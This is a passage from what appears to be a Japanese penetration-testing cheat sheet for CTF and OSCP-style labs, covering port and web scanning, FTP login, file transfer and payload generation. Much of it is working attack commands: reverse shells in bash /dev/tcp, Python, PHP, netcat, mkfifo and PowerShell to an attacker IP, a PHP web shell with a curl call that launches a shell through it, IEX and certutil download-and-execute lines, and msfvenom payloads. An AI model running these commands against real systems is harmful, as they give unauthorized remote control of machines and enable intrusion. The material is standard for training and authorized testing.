<li><a href="#%E3%83%A1%E3%83%A2%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97%E3%81%AE%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E3%82%84%E3%81%A4">メモリ読み出しのよく使うやつ</a></li>
<li><a href="#%E3%83%AC%E3%82%B8%E3%82%B9%E3%83%88%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97">レジストリ読み出し</a></li>
<li><a href="#%E5%A4%89%E6%95%B0%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97">変数読み出し</a></li>
<li><a href="#%E5%AE%9F%E8%A1%8C%E6%99%82%E5%BC%95%E6%95%B0--%E6%A8%99%E6%BA%96%E5%85%A5%E5%87%BA%E5%8A%9B">実行時引数 / 標準入出力</a></li>
<li><a href="#gdb%E3%82%92python%E3%81%A7%E6%93%8D%E4%BD%9C%E3%81%99%E3%82%8B">GDBをPythonで操作する</a></li>
<li><a href="#gdb%E3%81%A7%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%82%A2%E3%82%BF%E3%83%83%E3%83%81%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC">GDBでプロセスにアタッチ(ワンライナー)</a></li>
<li><a href="#peda%E3%81%AE%E6%A9%9F%E8%83%BD%E3%82%92%E4%BD%BF%E3%81%86">pedaの機能を使う</a></li>
</ul>
</li>
<li><a href="#angr%E3%81%AE%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB">angrのサンプル</a></li>
</ul>
<h2 id="使用頻度の高いコマンドまとめ" style="position:relative;"><a href="#%E4%BD%BF%E7%94%A8%E9%A0%BB%E5%BA%A6%E3%81%AE%E9%AB%98%E3%81%84%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%BE%E3%81%A8%E3%82%81" aria-label="使用頻度の高いコマンドまとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用頻度の高いコマンドまとめ</h2>
<h3 id="攻略開始時ポートスキャン" style="position:relative;"><a href="#%E6%94%BB%E7%95%A5%E9%96%8B%E5%A7%8B%E6%99%82%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="攻略開始時ポートスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>攻略開始時(ポートスキャン)</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ターゲットマシンのIPをHOSTSに追加して高速スキャン</span>
<span class="token function">sudo</span> <span class="token function">sed</span> -i <span class="token string">'s/^[0-9].*targethost.htb/10.0.0.10  targethost.htb/g'</span> /etc/hosts
nmap -sV -sC -T4 targethost.htb<span class="token operator">|</span> <span class="token function">tee</span> nmap1.txt
rustscan -a targethost.htb --range <span class="token number">1</span>-10000<span class="token operator">|</span> <span class="token function">tee</span> ruststan-fast.txt

<span class="token comment"># All ports</span>
nmap -p- targethost.htb -Pn -sC -sV -A  <span class="token operator">|</span> <span class="token function">tee</span> nmap_max.txt</code></pre></div>
<p>参考：<a href="https://linux.die.net/man/1/nmap" target="_blank" rel="nofollow noopener noreferrer">nmap - Linux man page</a></p>
<p>参考：<a href="https://rustscan.github.io/RustScan/#-usage" target="_blank" rel="nofollow noopener noreferrer">RustScan | Faster Nmap Scanning with Rust</a></p>
<h3 id="ネットワーク探索のポイント" style="position:relative;"><a href="#%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88" aria-label="ネットワーク探索のポイント permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ネットワーク探索のポイント</h3>
<ul>
<li>Well Knownポートのスキャンだけで対象が見つからない場合は、全ポートのスキャンを試してみる。</li>
<li>アクセスしているWebページから有益な情報が得られない場合は、ページソースの中に情報漏洩が無いか確認してみる。</li>
<li>謎のTCPポートが解放されている場合、netcatで接続してみると何か出るかも。</li>
</ul>
<h3 id="webスキャン" style="position:relative;"><a href="#web%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="webスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Webスキャン</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># gobuster 特定のディレクトリ配下をさらに調べたいときは階層を追加する</span>
gobuster <span class="token function">dir</span> -u http://targethost.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t <span class="token number">40</span> <span class="token operator">|</span> <span class="token function">tee</span> gobuster.txt

<span class="token comment"># バックエンドの種類に合わせて変更する</span>
feroxbuster -u http://targethost.htb/ -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="token operator">|</span> <span class="token function">tee</span> feroxbuster.txt

feroxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="token operator">|</span> <span class="token function">tee</span> feroxbuster.txt

<span class="token comment">## --no-recursion</span>
feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion <span class="token operator">|</span> <span class="token function">tee</span> feroxbuster.txt

<span class="token comment"># WevDAVの探索</span>
/usr/bin/davtest -url http://targethost.htb/</code></pre></div>
<h3 id="ftp接続" style="position:relative;"><a href="#ftp%E6%8E%A5%E7%B6%9A" aria-label="ftp接続 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FTP接続</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># Anonymous Login</span>
$ <span class="token function">ftp</span> targethost.htb
Connected to targethost.htb.
Name <span class="token punctuation">(</span>targethost.htb:kali<span class="token punctuation">)</span>: anonymous</code></pre></div>
<h3 id="攻撃ファイル転送" style="position:relative;"><a href="#%E6%94%BB%E6%92%83%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E8%BB%A2%E9%80%81" aria-label="攻撃ファイル転送 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>攻撃ファイル転送</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># HTTP/FTPサーバ起動(ホスト側)</span>
<span class="token builtin class-name">cd</span> ~/Hacking/Tools
python3 -m http.server <span class="token number">5000</span>
python3 /home/kali/Hacking/Tools/localftp.py

<span class="token comment"># ファイルダウンロード(HTTP)</span>
<span class="token function">curl</span> <span class="token string">"http://10.10.10.7:5000/linpeas.sh"</span> -o <span class="token string">"linpeas.sh"</span>
<span class="token function">curl</span> <span class="token string">"http://10.10.10.7:5000/winPEASx64.exe"</span> -o <span class="token string">"winPEASx64.exe"</span>
Invoke-WebRequest <span class="token string">"http://10.10.10.7:5000/winPEASx64.exe"</span> -OutFile <span class="token string">"winPEASx64.exe"</span>
IEX<span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span><span class="token string">'http://10.10.10.7:5000/winPEASx64.bat'</span><span class="token punctuation">)</span>
certutil.exe -URLCache -split -f http://10.10.14.3:5000/exploit exploit.exe

<span class="token comment"># ファイルダウンロード(FTP)</span>
<span class="token comment"># FTPでWindowsマシンにバイナリを転送する場合は、binary modeを使わないと実行できないので注意</span>
<span class="token comment"># https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files</span>
<span class="token builtin class-name">echo</span> <span class="token function">open</span> <span class="token number">10.10</span>.14.3 <span class="token operator">></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> user user password <span class="token operator">>></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> binary <span class="token operator">>></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> get nc.exe nc.exe <span class="token operator">>></span> ftp.txt <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> quit <span class="token operator">>></span> ftp.txt
<span class="token function">ftp</span> -n <span class="token operator">&lt;</span> ftp.txt</code></pre></div>
<p>よく転送するファイル</p>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="nofollow noopener noreferrer">PEASS-ng/linPEAS at master · carlospolop/PEASS-ng</a></li>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="nofollow noopener noreferrer">PEASS-ng/winPEAS at master · carlospolop/PEASS-ng</a></li>
<li>
<p><a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="nofollow noopener noreferrer">rasta-mouse/Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.</a></p>
<ul>
<li>WinPEASで利用するWatsonによる脆弱性検索はWindowsServer 2016以降でしか動作しないためSherlockを使う場合がある</li>
</ul>
</li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="nofollow noopener noreferrer">SecWiki/windows-kernel-exploits: その他エクスプロイト</a></li>
<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="nofollow noopener noreferrer">AonCyberLabs/Windows-Exploit-Suggester</a></li>
<li><a href="https://www.kali.org/tools/windows-binaries/" target="_blank" rel="nofollow noopener noreferrer">windows-binaries | Kali Linux Tools</a></li>
<li><a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="nofollow noopener noreferrer">ohpe/juicy-potato</a></li>
<li><a href="https://github.com/Re4son/Churrasco" target="_blank" rel="nofollow noopener noreferrer">Re4son/Churrasco</a></li>
<li><a href="https://github.com/ParrotSec/mimikatz" target="_blank" rel="nofollow noopener noreferrer">ParrotSec/mimikatz</a></li>
</ul>
<h3 id="リバースシェル" style="position:relative;"><a href="#%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB" aria-label="リバースシェル permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>リバースシェル</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ホスト待ち受け</span>
<span class="token function">nc</span> -nlvp <span class="token number">4444</span>
<span class="token function">sudo</span> tcpdump -i tun0 icmp

<span class="token comment"># spawn</span>
python3 -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>

<span class="token comment"># よく使うrevshell</span>
<span class="token comment"># Bash</span>
<span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/10.10.10.1/4444 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
<span class="token operator"><span class="token file-descriptor important">0</span>&lt;&amp;</span><span class="token number">196</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> <span class="token number">19</span><span class="token operator"><span class="token file-descriptor important">6</span>&lt;></span>/dev/tcp/10.10.10.1/4444<span class="token punctuation">;</span> <span class="token function">sh</span> <span class="token operator">&lt;&amp;</span><span class="token number">196</span> <span class="token operator">>&amp;</span><span class="token number">196</span> <span class="token operator"><span class="token file-descriptor important">2</span>>&amp;</span><span class="token number">196</span>
/bin/bash -l <span class="token operator">></span> /dev/tcp/10.10.10.1/4444 <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>

<span class="token comment"># Python</span>
python -c <span class="token string">'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</span>

<span class="token comment"># PHP</span>
php -r <span class="token string">'$sock=fsockopen("10.10.10.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'</span>

<span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>

<span class="token function">curl</span> <span class="token string">"http://10.10.11.116/webshell.php"</span> --data-urlencode <span class="token string">"cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.16.7/4444 0&lt;&amp;1 2>&amp;1'"</span>

<span class="token comment"># Netcat</span>
<span class="token function">nc</span> -e /bin/sh <span class="token number">10.10</span>.10.1 <span class="token number">4444</span>
nc.exe -nv <span class="token number">10.10</span>.10.1 <span class="token number">4444</span> -e cmd.exe

<span class="token comment"># Unix</span>
<span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.10</span>.10.1 <span class="token number">4444</span> <span class="token operator">></span>/tmp/f

<span class="token comment"># PowerShell</span>
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class="token punctuation">(</span><span class="token string">"10.10.10.1"</span>,4444<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">..</span><span class="token number">65535</span><span class="token operator">|</span>%<span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">"> "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span>

powershell IEX <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">'http://10.10.10.1:5000/mini-reverse.ps1'</span><span class="token punctuation">)</span></code></pre></div>
<p>参考：<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="nofollow noopener noreferrer">Reverse Shell Cheat Sheet | pentestmonkey</a></p>
<p>参考：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="nofollow noopener noreferrer">PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings</a></p>
<p>参考：<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="nofollow noopener noreferrer">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a></p>
<p>参考：<a href="https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet" target="_blank" rel="nofollow noopener noreferrer">Reverse Shell Cheat Sheet - OSCP</a></p>
<p>参考：<a href="https://cheatsheet.haax.fr/windows-systems/exploitation/iis/" target="_blank" rel="nofollow noopener noreferrer">Offensive Security Cheatsheet</a></p>
<p>参考：<a href="https://github.com/kash1064/PayloadsAllTheThings?organization=kash1064&#x26;organization=kash1064" target="_blank" rel="nofollow noopener noreferrer">kash1064/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF</a></p>
<h3 id="ペイロードの生成" style="position:relative;"><a href="#%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%AE%E7%94%9F%E6%88%90" aria-label="ペイロードの生成 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ペイロードの生成</h3>
<ul>
<li>msfvenomはOSCPでも使用可能</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ip</span> addr <span class="token operator">|</span> <span class="token function">grep</span> -E -o <span class="token string">"10.10.([0-9]{1,3}[\.]){1}[0-9]{1,3}"</span><span class="token variable">`</span></span>

<span class="token comment"># IIS</span>
<span class="token comment"># ASP(.asp)はインタプリタ方式、ASP.NET(.aspx)はコンパイラ方式</span>
$ msfvenom -f aspx -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$LHOST</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -o rev.aspx</code></pre></div>
<p>参考：<a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/" target="_blank" rel="nofollow noopener noreferrer">MSFVenom Reverse Shell Payload Cheatsheet (with &#x26; without Meterpreter) | Infinite Logins</a></p>
<h2 id="スキャンツールまとめ" style="position:relative;"><a href="#%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%84%E3%83%BC%E3%83%AB%E3%81%BE%E3%81%A8%E3%82%81" aria-label="スキャンツールまとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>スキャンツールまとめ</h2>
<h3 id="ポートスキャン" style="position:relative;"><a href="#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="ポートスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ポートスキャン</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># フィルタされたポートの探索</span>
<span class="token function">sudo</span> nmap -sU -sT -T4 targethost.htb<span class="token operator">|</span> <span class="token function">tee</span> nmap-filtered.txt

<span class="token comment"># OS Scan</span>
<span class="token function">sudo</span> nmap -p- targethost.htb -Pn -sC -sV -A -O --osscan-guess <span class="token operator">|</span> <span class="token function">tee</span> nmap-os.txt

<span class="token comment"># IPv6スキャン</span>
nmap -sV -sC -T4 -6 dead:beef:0000:0000:0250:56ff:feb9:ba95 <span class="token operator">|</span> <span class="token function">tee</span> nmap-ipv6.txt

<span class="token comment"># Rustscan</span>
rustscan --ulimit <span class="token number">5000</span> -a targethost.htb <span class="token operator">|</span> <span class="token function">tee</span> rustscan.txt
<span class="token function">sed</span> -r <span class="token string">"s/<span class="token entity" title="\x1B">\x1B</span>\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"</span> rustscan.txt <span class="token operator">></span> rustscan.txt</code></pre></div>
<h3 id="データベースのスキャン" style="position:relative;"><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="データベースのスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>データベースのスキャン</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># MySQL(DB/Table/Data)のダンプ</span>
mysqldump -u USER_NAME -p -h HOST_NAME DB_NAME <span class="token operator">></span> OUTPUT_FILE_NAME
mysqldump -u USER_NAME -p -h HOST_NAME DB_NAME TABLE_NAME <span class="token operator">></span> OUTPUT_FILE_NAME
mysqldump -u USER_NAME -p -h HOST_NAME -A -n <span class="token operator">></span> OUTPUT_FILE_NAME </code></pre></div>
<h3 id="windowssambaシステムのスキャン" style="position:relative;"><a href="#windowssamba%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="windowssambaシステムのスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Windows/Sambaシステムのスキャン</h3>
